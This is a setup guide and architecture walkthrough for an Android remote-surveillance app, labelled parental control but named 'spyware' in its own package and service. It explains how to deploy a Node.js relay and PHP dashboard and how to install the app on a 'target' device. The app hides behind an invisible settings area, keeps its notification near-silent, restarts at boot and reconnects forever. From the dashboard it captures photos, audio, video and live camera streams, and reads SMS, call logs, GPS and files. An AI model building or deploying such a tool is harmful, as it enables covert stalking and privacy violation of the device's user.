# 🛠️ Complete Setup Guide — WebRTC Android ParentControl v2.0

> **Architecture**: Android App (Kotlin) ↔ Node.js Backend (Render) ↔ PHP Dashboard (your PHP host + MySQL)

---

## 📋 Requirements

| Component | Requirement |
|---|---|
| PHP Host | Any shared hosting / VPS / cPanel with PHP 7.4+, MySQL 5.7+ |
| Node.js Server | Render.com free tier (or any VPS with Node 18+) |
| Android Device | Android 9+ (API 28+), Camera + Mic permissions |
| Browser | Chrome 80+ / Firefox 75+ / Edge 80+ / Safari 13+ |
| Android Studio | Arctic Fox+ |
| npm | v8+ |

---

## 🏗️ Full Architecture

```
┌──────────────────────────────────────────────────────────────────┐
│                     SYSTEM ARCHITECTURE                          │
└──────────────────────────────────────────────────────────────────┘

  📱 Android Device                    🖥️ Admin Browser
  ┌─────────────────┐                 ┌─────────────────┐
  │ SpywareService  │                 │  PHP Dashboard  │
  │ (Foreground)    │                 │  index.php      │
  │                 │                 │  login.php      │
  │ SocketManager   │◄───Socket.IO───►│  (PHP host)     │
  │ MediaCapture    │                 │                 │
  │ Manager         │      ▲          │  Browser JS     │
  │                 │      │          │  ↕ Socket.IO    │
  │ WebRTC          │      │          │  ↕ WebRTC       │
  │ PeerConnection  │      │          └────────┬────────┘
  └─────────────────┘      │                  │
         │                 └──────────────────┘
         │                         ▲
         ▼                         │
  ┌──────────────────────────────────────────────────────┐
  │           Node.js Backend (Render.com)               │
  │           node-backend/server.js                     │
  │                                                      │
  │  • Device registration (register-device)             │
  │  • Controller join (join-as-controller)              │
  │  • WebRTC signaling (offer/answer/ice-candidate)     │
  │  • Capture commands relay (image/audio/video)        │
  │  • Media base64 forwarding (media-captured→ready)    │
  │  • GET /health → { status: 'ok' } for Render         │
  └──────────────────────────────────────────────────────┘
         │
         ▼ (base64 media upload via fetch POST)
  ┌──────────────────────────────────────────────────────┐
  │           PHP Dashboard + MySQL                      │
  │  install.php → one-click DB + admin setup            │
  │  login.php   → bcrypt auth                           │
  │  index.php   → dashboard UI + WebRTC viewer          │
  │  upload_media.php → save media to uploads/           │
  │  MySQL: admins, devices, media_captures tables       │
  │  Auto-delete media after 24 hours                    │
  └──────────────────────────────────────────────────────┘
```

---

## 🚀 Step-by-Step Setup

### Step 1 — Clone Repository

```bash
git clone https://github.com/david0154/WebRTC-Android-prentcontrol.git
cd WebRTC-Android-prentcontrol
```

---

### Step 2 — Deploy Node.js Server on Render

1. Go to [render.com](https://render.com) → **New Web Service**
2. Connect your GitHub repo
3. Set these settings:

| Setting | Value |
|---|---|
| Root Directory | `node-backend` |
| Build Command | `npm install` |
| Start Command | `node server.js` |
| Environment | `Node` |
| Health Check Path | `/health` |
| Plan | Free |

4. Click **Create Web Service** → wait for deploy
5. Copy your Render URL: `https://YOUR-APP.onrender.com`

> ⚠️ **Render Free Tier**: Server sleeps after 15 min inactivity. Android SocketManager has infinite auto-reconnect to handle wake-up.

> ✅ **`/` endpoint returns JSON only** — no web dashboard at Render URL. Dashboard is on your PHP host.

---

### Step 3 — Setup PHP Dashboard (One-Click Install)

1. Upload the entire `php-dashboard/` folder to your PHP web host (FTP/cPanel)
2. Open in browser: `https://your-domain.com/install.php`
3. Fill in the installer form:

| Field | Example |
|---|---|
| DB Host | `localhost` |
| DB Name | `parentcontrol` |
| DB User | `your_db_user` |
| DB Password | `your_db_pass` |
| Admin Username | `admin` |
| Admin Password | `StrongPass123!` |
| Node.js Backend URL | `https://YOUR-APP.onrender.com` |

4. Click **Install Now** — database + tables auto-created, `config.php` written
5. ⚠️ **Delete `install.php`** immediately after successful install
6. Visit `https://your-domain.com/login.php` → login → Dashboard ready

---

### Step 4 — Configure Android App

1. Open project root in **Android Studio**
2. Open `app/src/main/java/com/webrtc/spyware/SpywareService.kt`
3. Set your Render URL:
```kotlin
// Replace this line:
private val SERVER_URL = "https://YOUR-RENDER-APP.onrender.com"
```

4. Configure TURN server credentials (optional, for cross-network):
```kotlin
ice.add(
    PeerConnection.IceServer.builder("turn:numb.viagenie.ca")
        .setUsername("your-actual-username")   // 🔑 Replace
        .setPassword("your-actual-password")   // 🔑 Replace
        .createIceServer()
)
```

5. Open `app/src/main/AndroidManifest.xml` and merge all entries from `AndroidManifest_additions.xml`:

```xml
<!-- Add inside <manifest> -->
<uses-permission android:name="android.permission.CAMERA" />
<uses-permission android:name="android.permission.RECORD_AUDIO" />
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
<uses-permission android:name="android.permission.WAKE_LOCK" />
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
<uses-permission android:name="android.permission.READ_SMS" />
<uses-permission android:name="android.permission.READ_CALL_LOG" />
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />

<!-- Add inside <application> -->
<service
    android:name=".SpywareService"
    android:exported="false"
    android:foregroundServiceType="camera|microphone" />

<receiver
    android:name=".BootReceiver"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED" />
    </intent-filter>
</receiver>
```

6. **Sync Gradle** → **Build → Generate Signed APK**
7. Install APK on target Android device
8. Open app → tap **top-right invisible area** → open Streaming Settings
9. Verify server URL is correct → toggle streaming ON
10. Grant all permissions:
    - 📷 Camera | 🎤 Microphone | 📍 Location (Fine)
    - 💬 SMS | 📞 Call Log | 🔔 Notifications
    - 💾 Manage External Storage (Android 11+ for File Explorer)

---

### Step 5 — Launch & Verify

```bash
# Expected output when Node.js starts:
# ✅ WebRTC Signaling Server Running
# 🔌 Socket.IO initialized and ready
# Server listening on port 3000
```

1. Open PHP dashboard → `https://your-domain.com/login.php`
2. Login with admin credentials
3. Within a few seconds device appears in **Connected Devices** section
4. Click **▶ Live View** → camera stream appears
5. Click **📷 Photo** / **🎤 Audio** / **🎬 Video** → media captured remotely
6. Click **📂 Files** → browse device storage
7. Check **SMS**, **Calls**, **GPS** tabs for live data

> 💡 **Pro Tip**: Keep the Android app in the foreground initially. Once all streams initialize, you can minimize it.

---

## 📖 Complete Codebase Deep Dive

---

### 🤖 Android — Kotlin Source Files

#### `SpywareService.kt` — Main Foreground Service

```
SpywareService (extends Service)
│
├── onCreate()
│   ├── createNotificationChannel()     → silent notification (IMPORTANCE_MIN)
│   ├── startForeground(1, notification) → keeps process alive
│   ├── reads ANDROID_ID                → unique device identifier
│   ├── creates SocketManager(url, deviceId, callback)
│   ├── creates MediaCaptureManager(context, socketManager)
│   └── socketManager.connect()         → initiates Socket.IO
│
├── handleCaptureCommand(type, params)
│   ├── "image"  → mediaCaptureManager.captureImage(useFront)
│   ├── "audio"  → mediaCaptureManager.captureAudio(duration)
│   ├── "video"  → mediaCaptureManager.captureVideo(duration, useFront)
│   └── "start-stream" → trigger WebRTC offer in Activity
│
├── onStartCommand() → returns START_STICKY (auto-restart if killed)
└── onDestroy()      → release mediaCaptureManager + socketManager
```

---

#### `SocketManager.kt` — Socket.IO Client

```
SocketManager
│
├── connect()
│   ├── IO.Options: reconnection=true, delay=2s, maxDelay=10s, attempts=∞
│   ├── on(EVENT_CONNECT)        → emits "register-device" { deviceId }
│   ├── on(EVENT_DISCONNECT)     → logs, isConnected=false
│   ├── on("capture-image")      → onCaptureCommand("image", params)
│   ├── on("capture-audio")      → onCaptureCommand("audio", params)
│   ├── on("capture-video")      → onCaptureCommand("video", params)
│   └── on("start-stream")       → onCaptureCommand("start-stream", {})
│
├── sendMediaCapture(base64, type, filename, mimeType)
│   └── emits "media-captured" → { deviceId, type, base64, filename, mimeType }
│
├── emitSignaling(event, data)   → forward WebRTC SDP/ICE
└── disconnect()                 → clean shutdown
```

**Auto-reconnect**: `reconnectionAttempts = Int.MAX_VALUE` with 2s→10s exponential backoff. Server uses `pingTimeout: 60000` / `pingInterval: 25000`.

---

#### `MediaCaptureManager.kt` — Silent Capture

```
MediaCaptureManager
│
├── captureImage(useFront: Boolean)
│   ├── getFacingCamera(LENS_FACING_FRONT / BACK)
│   ├── ImageReader(1280×720, JPEG, maxImages=1)
│   ├── Camera2: openCamera → createCaptureSession → TEMPLATE_STILL_CAPTURE
│   └── onImageAvailable: buffer → Base64.encode → sendMediaCapture()
│
├── captureAudio(durationSeconds: Int = 10)
│   ├── MediaRecorder: MIC → MPEG_4 → AAC @ 128kbps / 44.1kHz
│   ├── setMaxDuration(seconds × 1000)
│   └── MAX_DURATION_REACHED → stop() → sendFile() → file.delete()
│
├── captureVideo(durationSeconds: Int = 15, useFront: Boolean)
│   ├── MediaRecorder: SURFACE + MIC → MPEG_4 → H264 + AAC
│   ├── 1280×720 @ 30fps, 3Mbps bitrate
│   ├── Camera2 → TEMPLATE_RECORD → setRepeatingRequest
│   └── mediaRecorder.start() → MAX_DURATION_REACHED → sendFile()
│
├── sendFile(file, type, mime)  → readBytes → Base64 → socketManager.sendMediaCapture()
├── getFacingCamera(facing)     → filters cameraIdList by LENS_FACING
└── release()                  → stop recorder, close camera, quit thread
```

**Background thread**: `HandlerThread("CaptureThread")` + `Handler(bgThread.looper)` — all Camera2 callbacks off main thread.

---

#### `BootReceiver.kt` — Auto-Start on Boot

Listens for `ACTION_BOOT_COMPLETED` → calls `startForegroundService(SpywareService)` on Android O+ or `startService()` on older.

---

### 🟢 Node.js Backend — `node-backend/server.js`

Pure Socket.IO signaling server — no web UI, no static file serving.

```
server.js
│
├── GET /        → { status: 'ok' }   (JSON only, no dashboard)
├── GET /health  → { status: 'ok', connections: N }
│
├── State
│   ├── rooms{}         → socket.id → { type, deviceId }
│   └── deviceSockets{} → deviceId → socket.id
│
└── io.on("connection", socket)
    ├── "register-device"     (Android)
    │   ├── deviceSockets[deviceId] = socket.id
    │   ├── socket.join(`device_${deviceId}`)
    │   └── io.emit("device-list-update", allDeviceIds)
    │
    ├── "join-as-controller"  (Dashboard)
    │   ├── socket.join(`ctrl_${deviceId}`)
    │   └── io.to(`device_${deviceId}`).emit("start-stream")
    │
    ├── WebRTC Signaling
    │   ├── "offer"          → io.to(data.to).emit("offer", { sdp, from })
    │   ├── "answer"         → io.to(data.to).emit("answer", { sdp, from })
    │   └── "ice-candidate"  → io.to(data.to).emit("ice-candidate", { candidate, from })
    │
    ├── Capture Commands (Dashboard → Device)
    │   ├── "capture-image" → io.to(`device_${id}`).emit("capture-image", { camera })
    │   ├── "capture-audio" → io.to(`device_${id}`).emit("capture-audio", { duration })
    │   └── "capture-video" → io.to(`device_${id}`).emit("capture-video", { duration, camera })
    │
    ├── "media-captured"      (Android → Dashboard relay)
    │   └── io.to(`ctrl_${deviceId}`).emit("media-ready", data)
    │
    └── "disconnect"
        ├── remove from deviceSockets{}
        └── io.emit("device-list-update", remaining)
```

---

### 🐘 PHP Dashboard — `php-dashboard/`

#### `install.php` — One-Click Installer

```
POST handler:
├── PDO connect to MySQL
├── CREATE DATABASE IF NOT EXISTS `parentcontrol`
├── CREATE TABLE admins    (id, username UNIQUE, password bcrypt, created_at)
├── CREATE TABLE devices   (id, device_id UNIQUE, device_name, last_seen)
├── CREATE TABLE media_captures
│   (id, device_id, media_type ENUM, filename, file_path, file_size,
│    captured_at, expires_at | INDEX on device_id, media_type, captured_at)
├── INSERT admin: password_hash(pass, PASSWORD_BCRYPT)
├── Write config.php with all constants
└── mkdir uploads/ + uploads/.htaccess (Options -Indexes)
```

#### `login.php` — Authentication

```
├── GET  → show login form
└── POST → PDO SELECT admins WHERE username=?
           password_verify(input, hash)
           match → $_SESSION['admin_id'] → redirect index.php
           fail  → show error
```

#### `index.php` — Main Dashboard

```
├── Auth check → redirect login.php if not logged in
├── Auto-cleanup: DELETE FROM media_captures WHERE expires_at < NOW()
├── Stats: COUNT devices, images, audios, videos
├── Fetch: device_list (50 by last_seen DESC)
├── Fetch: recent_media (30 by captured_at DESC)
│
├── HTML
│   ├── Stats tiles (4: devices / images / audios / videos)
│   ├── Device Cards grid
│   │   ├── [▶ Live View]  → startLive(deviceId)
│   │   ├── [📷 Photo]     → captureImage(deviceId)
│   │   ├── [🎤 Audio]     → captureAudio(deviceId)
│   │   └── [🎬 Video]     → captureVideo(deviceId)
│   ├── Live View section  → <video id="remote-video" autoplay>
│   └── Media Gallery      → img/audio/video + download/delete
│
└── JavaScript (Socket.IO + WebRTC)
    ├── io(NODE_URL, { reconnection:true, reconnectionDelay:2000 })
    ├── on("connect")            → status bar ✅
    ├── on("disconnect")         → status bar 🔴
    ├── on("device-list-update") → green border on online devices
    ├── startLive(deviceId)      → new RTCPeerConnection(STUN)
    │   ├── ontrack              → remote-video.srcObject = stream
    │   └── emit "join-as-controller"
    ├── on("offer")              → setRemoteDesc → createAnswer → emit "answer"
    ├── on("ice-candidate")      → addIceCandidate
    ├── captureImage/Audio/Video → emit command via socket
    └── on("media-ready")        → b64toBlob → FormData → POST upload_media.php
```

#### `upload_media.php` — Media Storage

```
POST handler:
├── Sanitize: device_id (regex), media_type (whitelist)
├── Check $_FILES['file']['tmp_name']
├── Filename: {device_id}_{date}_{uniqid}.{ext}
├── move_uploaded_file() to uploads/
├── expires_at = NOW() + MEDIA_TEMP_EXPIRY_HOURS
├── INSERT INTO media_captures
├── INSERT INTO devices ... ON DUPLICATE KEY UPDATE last_seen=NOW()
└── return JSON { success: true, filename }
```

---

### 🗄️ Database Schema

```sql
-- Admin users
CREATE TABLE admins (
    id         INT AUTO_INCREMENT PRIMARY KEY,
    username   VARCHAR(100) NOT NULL UNIQUE,
    password   VARCHAR(255) NOT NULL,        -- bcrypt hash
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Connected Android devices
CREATE TABLE devices (
    id          INT AUTO_INCREMENT PRIMARY KEY,
    device_id   VARCHAR(100) NOT NULL UNIQUE,  -- ANDROID_ID
    device_name VARCHAR(200),
    last_seen   DATETIME,
    created_at  DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Temporary media captures (auto-purged)
CREATE TABLE media_captures (
    id          INT AUTO_INCREMENT PRIMARY KEY,
    device_id   VARCHAR(100) NOT NULL,
    media_type  ENUM('image','audio','video') NOT NULL,
    filename    VARCHAR(300) NOT NULL,
    file_path   VARCHAR(500) NOT NULL,
    file_size   INT DEFAULT 0,
    captured_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    expires_at  DATETIME DEFAULT NULL,           -- NULL = never expires
    INDEX (device_id),
    INDEX (media_type),
    INDEX (captured_at)
);
```

---

## 🔄 Full Data Flows

### 📸 Media Capture Flow

```
1. Admin clicks [📷 Photo] in browser dashboard
      ↓
2. index.php JS: socket.emit("capture-image", { deviceId, camera: "front" })
      ↓
3. Node.js: io.to(`device_${deviceId}`).emit("capture-image", { camera })
      ↓
4. Android SocketManager: receives "capture-image"
      → onCaptureCommand("image", { camera: "front" })
      ↓
5. SpywareService: mediaCaptureManager.captureImage(useFront=true)
      ↓
6. MediaCaptureManager: Camera2 → ImageReader → onImageAvailable
      → readBytes → Base64.encode
      → socketManager.sendMediaCapture(b64, "image", filename, "image/jpeg")
      ↓
7. Android: socket.emit("media-captured", { deviceId, type, base64, filename })
      ↓
8. Node.js: io.to(`ctrl_${deviceId}`).emit("media-ready", data)
      ↓
9. Browser JS: b64toBlob → FormData → fetch("upload_media.php", POST)
      ↓
10. upload_media.php: move_uploaded_file → INSERT media_captures
      ↓
11. location.reload() → image appears in gallery ✅
```

### 📺 WebRTC Live View Flow

```
1. Admin clicks [▶ Live View]
      ↓
2. Browser: new RTCPeerConnection(STUN)
   socket.emit("join-as-controller", { deviceId })
      ↓
3. Node.js: socket.join(`ctrl_${deviceId}`)
   → io.to(`device_${deviceId}`).emit("start-stream")
      ↓
4. Android: receives "start-stream"
   → getUserMedia → createOffer → setLocalDescription
   socket.emit("offer", { to: controllerId, sdp })
      ↓
5. Node.js: io.to(controllerId).emit("offer", { sdp, from })
      ↓
6. Browser: setRemoteDescription → createAnswer → setLocalDescription
   socket.emit("answer", { to: from, sdp })
      ↓
7. ICE candidates exchanged via Node.js relay
      ↓
8. WebRTC P2P established → ontrack: remote-video.srcObject = stream 📺
```

---

## 🔧 Local Development

```bash
# 1. Run Node.js backend locally
cd node-backend
npm install
node server.js
# → http://localhost:3000

# 2. PHP dashboard — XAMPP/Laragon
# Copy php-dashboard/ to htdocs/
# Open install.php → use localhost DB
# Set Node URL to http://localhost:3000

# 3. Android emulator
# SERVER_URL = "http://10.0.2.2:3000"   (emulator → host machine)
# SERVER_URL = "http://YOUR-LAN-IP:3000" (physical device)
```

---

## 🚨 Troubleshooting

| Problem | Cause | Fix |
|---|---|---|
| Device not in dashboard | Wrong `SERVER_URL` | Check `SpywareService.kt` → Render URL |
| `install.php` DB error | Wrong credentials | Verify MySQL user has CREATE privilege |
| Capture does nothing | Device offline | Check green border on device card |
| Live view black screen | No HTTPS / WebRTC blocked | Ensure PHP host uses HTTPS; allow camera in browser |
| Media not in gallery | `uploads/` not writable | `chmod 755 php-dashboard/uploads/` |
| Render sleeping | Free tier | Android auto-reconnects; use UptimeRobot to keep alive |
| Audio/Video garbled | Low network | MediaRecorder: 128kbps AAC + 3Mbps H264; reduce if needed |
| API 34 build fail | `foregroundServiceType` | Add `FOREGROUND_SERVICE_CAMERA` + `MICROPHONE` permissions |
| App killed | Battery optimization | Whitelist from device battery settings |
| GPS not showing | Permission missing | Grant `ACCESS_FINE_LOCATION` + enable GPS |
| File explorer drops | Network unstable | Auto-reconnects; 64KB chunks handle large files |

---

## 📦 Environment Variables

### Render (Node.js)
| Variable | Value |
|---|---|
| `PORT` | Auto-set by Render (3000 default) |
| `NODE_ENV` | `production` |

### PHP Host
All config written to `config.php` by `install.php`. No `.env` file needed.

---

## 📂 Complete File Tree

```
WebRTC-Android-prentcontrol/
│
├── 📱 Android App (Kotlin)
│   ├── app/build.gradle.kts
│   └── app/src/main/
│       ├── AndroidManifest.xml
│       ├── AndroidManifest_additions.xml     ← full permissions guide
│       └── java/com/webrtc/spyware/
│           ├── SpywareService.kt             ← foreground service (MAIN)
│           ├── SocketManager.kt              ← Socket.IO + auto-reconnect
│           ├── MediaCaptureManager.kt        ← Camera2 + MediaRecorder
│           └── BootReceiver.kt               ← auto-start on boot
│
├── 🟢 Node.js Backend (Render)
│   └── node-backend/
│       ├── server.js                         ← Socket.IO signaling
│       ├── package.json
│       └── render.yaml                       ← Render deploy config
│
├── 🐘 PHP Dashboard (your host)
│   └── php-dashboard/
│       ├── install.php                       ← one-click installer ⚠️ delete after
│       ├── config.php                        ← auto-generated by installer
│       ├── login.php                         ← admin login (bcrypt)
│       ├── index.php                         ← main dashboard + gallery
│       ├── upload_media.php                  ← media storage endpoint
│       ├── delete_media.php                  ← file + DB removal
│       ├── logout.php
│       ├── .htaccess
│       ├── uploads/                          ← media files (auto-created)
│       └── README.md
│
├── 📦 Legacy Server (backward compat)
│   └── Android-WebRTC-Spyware-Server/
│       ├── server.js                         ← updated with new events
│       ├── package.json
│       └── render.yaml
│
├── README.md                                 ← project overview + features
├── SETUP.md                                  ← this file
└── LICENSE
```

---

*Built with Node.js · Socket.IO · WebRTC · PHP · MySQL · Kotlin · Camera2 API · MediaRecorder · Firebase*
